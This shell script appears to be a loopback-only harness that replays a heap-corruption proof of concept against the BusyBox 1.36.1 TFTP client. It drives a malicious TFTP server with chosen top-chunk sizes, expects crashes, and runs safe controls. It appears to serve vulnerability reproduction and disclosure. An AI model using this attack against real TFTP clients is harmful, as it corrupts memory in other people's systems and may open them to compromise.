#!/bin/sh
# Distribution-artifact replay: real Ubuntu busybox-static 1.36.1 client on the
# same loopback server. All sockets bind 127.0.0.1 only; no external probe.
set +e
cd "$(dirname "$0")" || exit 1
BB=/usr/bin/busybox
echo "=== CLOCK $(date -u)"
echo "=== ARTIFACT"
sha256sum "$BB"
dpkg-query -W -f='${Package} ${Version} ${Architecture}\n' busybox-static 2>/dev/null
echo "=== HARNESSES"
sha256sum heap_probe.py malicious_tftp.py run-distro.sh
echo "=== 1 ATTACK chosen top size 0x4141414141414141 (expect SIGABRT)"
python3 heap_probe.py "$BB" attack 0x4141414141414141
echo "=== 2 ISOLATION original top size 0x20cb1 (expect rc 1, no abort)"
python3 heap_probe.py "$BB" attack 0x20cb1
echo "=== 3 VARIANT chosen top size 0x4242424242424242 (expect SIGABRT)"
python3 heap_probe.py "$BB" attack 0x4242424242424242
echo "=== 4 VARIANT top size 0x21 (expect sysmalloc assertion)"
python3 heap_probe.py "$BB" attack 0x21
echo "=== 5 CONTROL no -b 64, same 516-byte ERROR (expect rc 1, no abort)"
python3 heap_probe.py "$BB" control
echo "=== 6 SAFE OACK control (expect rc 0, no fallback)"
python3 malicious_tftp.py "$BB" oack 64
echo "=== 7 SAFE DEFAULT-BLKSIZE control (expect rc 0, no fallback)"
python3 malicious_tftp.py "$BB" default -
echo "=== DONE $(date -u)"
